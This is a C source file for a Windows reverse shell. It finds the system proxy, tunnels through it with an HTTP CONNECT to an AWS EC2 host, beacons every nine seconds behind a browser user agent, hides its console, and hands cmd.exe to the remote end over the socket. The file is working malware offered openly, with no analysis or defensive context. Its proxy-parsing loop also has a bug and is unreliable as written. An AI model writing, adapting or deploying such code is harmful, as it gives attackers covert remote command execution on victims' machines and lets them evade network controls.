#include <winsock2.h>   // Sock Head. Includes socket functions from socket lib.
#include <windows.h>    // Win API Head. Include Win API functions.
#include <ws2tcpip.h>   // TCP-IP Head. Definitions for TCP/IP protocols.
#include <wininet.h>    // Proxy discovery
#include <stdio.h>      

#pragma comment(lib, "Ws2_32.lib")
#define DEF_BUFLEN 1024

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------
void open_Shell(char *C_2, int C_2port) {
    //  PROXY DISCOVERY
    DWORD dwSize;
    LPINTERNET_PROXY_INFO prox_Info;                                                // Structure to obtain proxy address through a handle using InternetOpen().
    // 
    char lpszData[100] = "";                                                        // Local proxy info storage.
    InternetQueryOption(NULL, INTERNET_OPTION_PROXY, lpszData, &dwSize);            // Query and load variables with the data.
    prox_Info = (LPINTERNET_PROXY_INFO)lpszData;                                    // Convert and store the proxy info into the container.
    printf("Proxy Connected: %s\n", (prox_Info->lpszProxy));
    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------
    char local_Proxy[strlen(prox_Info->lpszProxy)];
    memset(local_Proxy, 0, sizeof(local_Proxy));
    char local_ProxyPort_raw[6];
    int local_ProxyPort;

    for (int i = 0; i < strlen(prox_Info->lpszProxy); i++) {
        if ((prox_Info->lpszProxy)[i] == *":") {
            i++;
            for (int x = 0; x < strlen(prox_Info->lpszProxy); i++) {
                local_ProxyPort_raw[x] = (prox_Info->lpszProxy)[i];
                x++;
            }
            break;
        }
        else {
            local_Proxy[i] = (prox_Info->lpszProxy)[i];
        }
    }
    local_ProxyPort = atoi(local_ProxyPort_raw);
    printf("Proxy Server: %s\nProxy Port: %d\n", local_Proxy, local_ProxyPort);

    char http_Request[] = ("CONNECT ec2-x-x-x-x.compute-1.amazonaws.com:443 HTTP/1.1\r\n"
                           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\r\n"
                           "Accept: text/html,application/xhtml+xml,application/xml;q=.9,*/*;q=0.8\r\n"
                           "Accept-Language: en-US,en;q=0.5\r\n"
                           "Accept-Encoding: gzip, deflate\r\n"
                           "Upgrade-Insecure-Requests: 0\r\n"
                           "Connection: ignore-me\r\n"
                           "Host: ec2-x-x-x-x.compute-1.amazonaws.com\r\n\r\n");
    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------
    while (true) {
        Sleep(9000);                            // Beaconing
        // Initialize connection for TCP / IP.
        SOCKET sock;
        sockaddr_in sock_addr;
        WSADATA sock_info;
        WSAStartup(MAKEWORD(2, 2), &sock_info);
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
        sock_addr.sin_family = AF_INET;

        sock_addr.sin_addr.s_addr = inet_addr(local_Proxy);         // Convert the pointed to string to an internet address value int.
        sock_addr.sin_port = htons(local_ProxyPort);                // Conver u_short int from host into network-byte order.

        // Connecting
        int act_connection = WSAConnect(sock, (SOCKADDR *) &sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);    //  Socket, address name, name length, sock buffer, sock buffer, flowspec
        if (act_connection == SOCKET_ERROR) {               // Failure to connect.
            closesocket(sock);                              // Release socket.
            WSACleanup();                                   // Ends socket operations. Deregistering Win Sock DLL from implementations to free resources.
            continue;                                       // After closing socket, repeat loop.
        }
        else {                                                                    // Connections successful.
            send(sock, http_Request, (strlen(http_Request)+1), 0);                
            char recv_Data[DEF_BUFLEN];                                           // Variable for data receival.
            memset(recv_Data, 0, sizeof(recv_Data));
            int recv_bytes = recv(sock, recv_Data, DEF_BUFLEN, 0);                // receive a messages length from the connected socket.
            if (recv_bytes <= 0) {                                                // Socket is not connected if a message is received with 0 length. Restart the loop.
                closesocket(sock);
                WSACleanup();
                continue;
            }
            else {                                              // Receiving data.
                char cmd_process[] = "cmd.exe";
                STARTUPINFO win_properties;                     // Values to be used for the new process window.
                PROCESS_INFORMATION win_identifiers;            // Handles and identifiers, functionality of the new process.

                memset(&win_properties, 0, sizeof(win_properties));                                                             // Reset the properties structure.
                win_properties.cb = sizeof(win_properties);                                                                     // Set bytes size of structure.
                win_properties.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);                                         // Indicates wShowWindow, and input/output/error handle members, are used when the process window is created.
                win_properties.hStdInput = win_properties.hStdOutput = win_properties.hStdError = (HANDLE) sock;                // Typecast the socket into a handle, and pass it all app interaction.
                CreateProcess(NULL, cmd_process, NULL, NULL, TRUE, 0, NULL, NULL, &win_properties, &win_identifiers);           // Create the process, transfers the info to the handle.
                WaitForSingleObject(win_identifiers.hProcess, INFINITE);                                                        // Wait until process is created.
                CloseHandle(win_identifiers.hProcess);
                CloseHandle(win_identifiers.hThread);

                // Once again, check for incoming message.
                memset(recv_Data, 0, sizeof(recv_Data));
                recv_bytes = recv(sock, recv_Data, DEF_BUFLEN, 0);
                if (recv_bytes <= 0) {
                    closesocket(sock);
                    WSACleanup();
                    continue;
                }
                if (strcmp(recv_Data, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------
int main(int argc, char **argv) {
    FreeConsole();              // Detach process from console.

    if (argc == 3) {            // If 3 arguments.
        int host_port = atoi(argv[2]);
        open_Shell(argv[1], host_port);
    }
    else {                      // Base option.
        char host_ip[] = "127.0.0.1";
        int host_port = 8080;
        open_Shell(host_ip, host_port);
    }
    return 0;
}
